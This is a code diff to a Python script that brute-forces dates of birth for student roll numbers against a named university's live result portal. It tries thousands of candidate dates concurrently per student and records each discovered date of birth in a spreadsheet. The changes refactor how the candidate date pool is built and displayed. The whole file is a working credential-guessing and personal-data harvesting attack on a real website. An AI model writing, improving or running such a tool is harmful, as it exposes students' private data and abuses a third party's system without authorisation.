@@ -145,6 +145,17 @@ def generate_dates_interleaved(years, month=None):
                 break
     return dates
 
+def build_candidate_dates(priority_groups, month=None):
+    candidate_dates = []
+    seen = set()
+    for group in priority_groups:
+        group_dates = generate_dates_interleaved(group, month)
+        for d in group_dates:
+            if d not in seen:
+                candidate_dates.append(d)
+                seen.add(d)
+    return candidate_dates
+
 async def try_dob(session, roll_no, semester, date_of_birth, semaphore):
     url = "https://result.ddugu.ac.in/result2023/searchresult_new.aspx"
     async with semaphore:
@@ -176,32 +187,31 @@ async def try_dob(session, roll_no, semester, date_of_birth, semaphore):
             return None
     return None
 
-async def fetch_for_roll(session, roll_no, semester, priority_groups, month_filter, semaphore, results, results_lock, roll_pbar, filename=None, save_to_excel=True):
+async def fetch_for_roll(session, roll_no, semester, candidate_dates, semaphore, results, results_lock, roll_pbar, filename=None, save_to_excel=True):
     roll_str = str(roll_no).zfill(6)
 
     bar_format = f"    {UI.GRAY}{{desc:<22}}{UI.RESET} {{percentage:3.0f}}%|{{bar:25}}| {{n_fmt}}/{{total_fmt}} [{UI.GRAY}{{elapsed}}<{{remaining}}{UI.RESET}]"
 
-    for years in priority_groups:
-        dates = generate_dates_interleaved(years, month_filter)
-        with tqdm(total=len(dates), desc=f"Testing {roll_str}", leave=False, position=1, dynamic_ncols=True, bar_format=bar_format) as date_pbar:
-            for dob in dates:
-                result = await try_dob(session, roll_str, semester, dob, semaphore)
-                if result == "DOWN":
-                    return "DOWN"
-                
-                date_pbar.update(1)
-                if result:
-                    async with results_lock:
-                        results.append({'Roll Number': roll_no, 'Semester': semester, 'Date of Birth': result})
-                        if save_to_excel and filename:
-                            try:
-                                pd.DataFrame(results).to_excel(filename, index=False)
-                            except PermissionError:
-                                pass # Will be saved later
-                    tqdm.write(f"  {UI.GREEN}✔ Found DOB for Roll No {roll_str} ➜ {UI.BOLD}{result}{UI.RESET}")
-                    roll_pbar.update(1)
-                    return
-    # If not found
+    with tqdm(total=len(candidate_dates), desc=f"Testing {roll_str}", leave=False, position=1, dynamic_ncols=True, bar_format=bar_format) as date_pbar:
+        for dob in candidate_dates:
+            result = await try_dob(session, roll_str, semester, dob, semaphore)
+            if result == "DOWN":
+                return "DOWN"
+            
+            date_pbar.update(1)
+            if result:
+                async with results_lock:
+                    results.append({'Roll Number': roll_no, 'Semester': semester, 'Date of Birth': result})
+                    if save_to_excel and filename:
+                        try:
+                            pd.DataFrame(results).to_excel(filename, index=False)
+                        except PermissionError:
+                            pass # Will be saved later
+                tqdm.write(f"  {UI.GREEN}✔ Found DOB for Roll No {roll_str} ➜ {UI.BOLD}{result}{UI.RESET}")
+                roll_pbar.update(1)
+                return
+
+    # If not found across all candidate dates
     async with results_lock:
         results.append({'Roll Number': roll_no, 'Semester': semester, 'Date of Birth': "N.A."})
         if save_to_excel and filename:
@@ -226,7 +236,12 @@ async def check_website_status(session, url):
         return False, str(e)
 
 async def run_custom_roll_search(roll_numbers, semester, month_filter, save_to_excel=True):
-    priority_groups = [[2003,2004,2005,2006,2007,2008],[1999,2000,2001,2002,2009,2010],[1996,1997,1998,2011,2012,2013]]
+    priority_groups = [
+        [2003, 2004, 2005, 2006, 2007, 2008],           # Tier 1 (2,192 dates)
+        [1999, 2000, 2001, 2002, 2009, 2010],           # Tier 2 (2,191 dates)
+        [1996, 1997, 1998, 2011, 2012, 2013]            # Tier 3 (2,192 dates)
+    ]
+    candidate_dates = build_candidate_dates(priority_groups, month_filter)
     filename = os.path.join(OUTPUT_DIR, "ddu_custom_results.xlsx") if save_to_excel else None
     url = "https://result.ddugu.ac.in/result2023/searchresult_new.aspx"
 
@@ -239,7 +254,10 @@ async def run_custom_roll_search(roll_numbers, semester, month_filter, save_to_e
             UI.error(f"Portal unavailable: {status_msg}")
             print(f"  {UI.GRAY}Please check your network connection or try again later.{UI.RESET}\n")
             return
-        print(f"{UI.GREEN}[ONLINE]{UI.RESET}\n")
+        print(f"{UI.GREEN}[ONLINE]{UI.RESET}")
+
+        pool_desc = f"{len(candidate_dates):,} dates (1996–2013 prioritized)" if not month_filter else f"{len(candidate_dates):,} dates (Month {month_filter}, 1996–2013)"
+        print(f"  {UI.BLUE}📅 Candidate Search Pool    :{UI.RESET} {UI.WHITE}{pool_desc}{UI.RESET}\n")
 
         if save_to_excel and filename and os.path.exists(filename):
             existing_df = pd.read_excel(filename)
@@ -261,7 +279,7 @@ async def run_custom_roll_search(roll_numbers, semester, month_filter, save_to_e
             roll_bar_format = f"  {UI.CYAN}{UI.BOLD}{{desc:<20}}{UI.RESET} {{percentage:3.0f}}%|{{bar:25}}| {{n_fmt}}/{{total_fmt}} [{UI.GRAY}{{elapsed}}<{{remaining}}{UI.RESET}]"
             with tqdm(total=len(remaining_rolls), desc="Rolls Processed", position=0, dynamic_ncols=True, bar_format=roll_bar_format) as roll_pbar:
                 tasks = [
-                    fetch_for_roll(session, rn, semester, priority_groups, month_filter, semaphore, results, results_lock, roll_pbar, filename, save_to_excel)
+                    fetch_for_roll(session, rn, semester, candidate_dates, semaphore, results, results_lock, roll_pbar, filename, save_to_excel)
                     for rn in remaining_rolls
                 ]
                 task_results = await asyncio.gather(*tasks)
